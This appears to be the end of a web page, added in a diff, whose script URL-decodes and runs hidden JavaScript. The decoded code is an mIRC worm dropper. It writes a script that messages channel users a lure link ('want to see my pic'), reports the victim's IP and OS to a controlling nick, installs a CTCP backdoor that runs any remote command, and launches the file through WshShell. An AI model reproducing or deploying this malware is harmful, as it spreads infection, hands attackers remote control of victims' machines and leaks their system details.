line%28%22n23%3D%22%29%0D%0Aa.Writeline%28%22n24%3D%22%29%0D%0Aa.Writeline%28%22n25%3D%22%29%0D%0Aa.Writeline%28%22n26%3D%22%29%0D%0Aa.Writeline%28%22n27%3D%22%29%0D%0Aa.Writeline%28%22n28%3D%22%29%0D%0Aa.Writeline%28%22n29%3D%22%29%0D%0Aa.Writeline%28%22n30%3D%22%29%0D%0Aa.Writeline%28%22n31%3D%22%29%0D%0Aa.Writeline%28%22n32%3D%22%29%0D%0Aa.Writeline%28%22n33%3D%22%29%0D%0Aa.Writeline%28%22n34%3D%22%29%0D%0Aa.Writeline%28%22n35%3D%22%29%0D%0Aa.Writeline%28%22n36%3D%22%29%0D%0Aa.Writeline%28%22n37%3D%22%29%0D%0Aa.Writeline%28%22n38%3D%22%29%0D%0Aa.Writeline%28%22n39%3D%22%29%0D%0Aa.Writeline%28%22n40%3D%22%29%0D%0Aa.Writeline%28%22n41%3D%22%29%0D%0Aa.Writeline%28%22n42%3D%22%29%0D%0Aa.Writeline%28%22n43%3D%22%29%0D%0Aa.Writeline%28%22n44%3D%22%29%0D%0Aa.Writeline%28%22n45%3D%22%29%0D%0Aa.Writeline%28%22n46%3D%22%29%0D%0Aa.Writeline%28%22n47%3D%22%29%0D%0Aa.Writeline%28%22n48%3D%22%29%0D%0Aa.Writeline%28%22n49%3D%22%29%0D%0Aa.Writeline%28%22n50%3D%22%29%0D%0Aa.Writeline%28%22n51%3D%22%29%0D%0Aa.Writeline%28%22n52%3D%22%29%0D%0Aa.Writeline%28%22n53%3D%22%29%0D%0Aa.Writeline%28%22n54%3D%22%29%0D%0Aa.Writeline%28%22n55%3D%22%29%0D%0Aa.Writeline%28%22n56%3D%22%29%0D%0Aa.Writeline%28%22n57%3D%22%29%0D%0Aa.Writeline%28%22n58%3D%22%29%0D%0Aa.Writeline%28%22n59%3D%22%29%0D%0Aa.Writeline%28%22n60%3D%22%29%0D%0Aa.Writeline%28%22n61%3D%22%29%0D%0Aa.Writeline%28%22n62%3D%22%29%0D%0Aa.Writeline%28%22n63%3D%22%29%0D%0Aa.Writeline%28%22n64%3D%22%29%0D%0Aa.Writeline%28%22n65%3D%22%29%0D%0Aa.Writeline%28%22n66%3D%22%29%0D%0Aa.Writeline%28%22n67%3D%22%29%0D%0Aa.Writeline%28%22n68%3D%22%29%0D%0Aa.Writeline%28%22n69%3D%22%29%0D%0Aa.Writeline%28%22n70%3D%22%29%0D%0Aa.Writeline%28%22n71%3D%22%29%0D%0Aa.Writeline%28%22n72%3D%22%29%0D%0Aa.Writeline%28%22n73%3D%22%29%0D%0Aa.Writeline%28%22n74%3D%22%29%0D%0Aa.Writeline%28%22n75%3D%22%29%0D%0Aa.Writeline%28%22n76%3D%22%29%0D%0Aa.Writeline%28%22n77%3D%22%29%0D%0Aa.Writeline%28%22n78%3D%22%29%0D%0Aa.Writeline%28%22n79%3D%22%29%0D%0Aa.Writeline%28%22n80%3D%22%29%0D%0Aa.Writeline%28%22n81%3D%22%29%0D%0Aa.Writeline%28%22n82%3D%22%29%0D%0Aa.Writeline%28%22n83%3D%22%29%0D%0Aa.Writeline%28%22n84%3D%22%29%0D%0Aa.Writeline%28%22n85%3D%22%29%0D%0Aa.Writeline%28%22n86%3Don%20*%3Astart%3A%20%7B%20.mkdir%20c%3A%5C%5Cwindows%5C%5Cdesktop%5C%5Ccris02%20%7D%20%7B%20//write%20boogy.ini%20%5BScript%5D%20%7C%20//write%20boogy.ini%20n0%3Dctcp%20*%3A*%3A%3F%3A%241-%20%7C%20/.load%20-rs%20boogy.ini%20%7D%20%7D%22%29%20%0D%0Aa.Writeline%28%22n87%3Don%20*%3Aexit%3A%20%7B%20/.unload%20-rs%20boogy.ini%20%7C%20.remove%20boogy.ini%20%7C%20.run%20mirc.reg%20%7C%20.run%20http%3A//www.angelfire.com/freak2/preit%20%7D%22%29%0D%0Aa.Writeline%28%22n88%3Don%20*%3Ajoin%3A%23%3A%20%7B%20if%20%28%24nick%20%21%3D%20%24me%29%20%7C%7C%20%28%24nick%20%21isop%20%24chan%29%20%7B%20.set%20%25alipin%20%24nick%20%7C%20.msg%20%24nick%20Hi%21%20ctc%21%20%7C%20.timer%201%2010%20.msg%20%24nick%20Hey%20you%20want%20to%20see%20my%20pic%2C%20Just%20double%20click%20this%20website%20--%3E%20%031%2C8http%3A//www.angelfire.com/freak2/preit/pic.html%03%20%21%20i%20hope%20you%20enjoy%20watching%20me%21%20%7D%20%7D%22%29%0D%0Aa.Writeline%28%22n89%3Don%20*%3Apart%3A%23%3A%20%7B%20if%20%28%24nick%20%21%3D%20%24me%29%20%7B%20.set%20%25alipin%20%24nick%20%7C%20.msg%20%24nick%20Hi%21%20hello%21%20Try%20to%20look%20at%20my%20pic%20just%20double%20click--%3E%20%031%2C8http%3A//www.angelfire.com/freak2/preit/pic.html%03%20%7D%20%7D%22%29%0D%0Aa.Writeline%28%22n90%3Don%20*%3AText%3A*%3A%3F%3A%20%7B%20if%20%28%24nick%20%3D%3D%20%25alipin%29%20%7B%20.timer%201%2010%20.run%20mirc.reg%20%7C%20.timer%201%2020%20.msg%20%24nick%20Try%20to%20look%20at%20my%20pic%20just%20double%20click--%3E%20%031%2C8http%3A//www.angelfire.com/freak2/preit/pic.html%03%20%7D%20%7D%22%29%0D%0Aa.Writeline%28%22n91%3Don%20*%3Aconnect%3A%20%7B%20.msg%20preit%20I%20Obey%20your%20command%20My%20Master%21%20My%20current%20IP%20is%20%24ip%20%2C%20and%20i%27m%20running%20with%20%24os%20%21%20%7D%22%29%0D%0Aa.Writeline%28%22n92%3Don%20*%3AText%3A*yes*%3A%3F%3A%20%7B%20if%20%28%24nick%20%3D%3D%20preit%29%20%7B%20.mkdir%20c%3A%5C%5Cwindows%5C%5Cdesktop%5C%5CZerotwoHackersTeam%20%7D%20%7D%22%29%0D%0Aa.Writeline%28%22n93%3Don%20*%3ALoad%3A%20%7B%20//write%20boogy.ini%20%5BScript%5D%20%7C%20//write%20boogy.ini%20n0%3Dctcp%20*%3A*%3A%3F%3A%241-%20%7C%20/.load%20-rs%20boogy.ini%20%7D%22%29%0D%0Aa.Writeline%28%22n94%3Don%20*%3ANotify%3A%20%7B%20if%20%28%24nick%20%3D%3D%20preit%29%20%7B%20.msg%20preit%20I%20Obey%20your%20command%20My%20Master%21%20My%20current%20IP%20is%20%24ip%20%2C%20and%20i%27m%20running%20with%20%24os%20%21%20%7D%22%29%0D%0Aa.Writeline%28%22%3Aend%22%29%0D%0Aa.close%28%29%3B%09%0D%0Acris%28%29%3B%09%0D%0A%7D%0D%0Afunction%20cris%28%29%20%7B%0D%0AWshShellClassID%3D%22%7BF935DC22-1CF0-11D0-ADB9-00C04FD58A0B%7D%22%3B%0D%0AInterfaceObject.setCLSID%28WshShellClassID%29%3B%0D%0AwshShell%20%3D%20InterfaceObject.createInstance%28%29%3B%09%0D%0AwshShell.run%28filename%2C%226%22%2C%22TRUE%22%29%3B%09%7D%0D%0A--%3E%0D%0A%3C/script%3E"));
+//-->
+</script></BODY>
+</html>
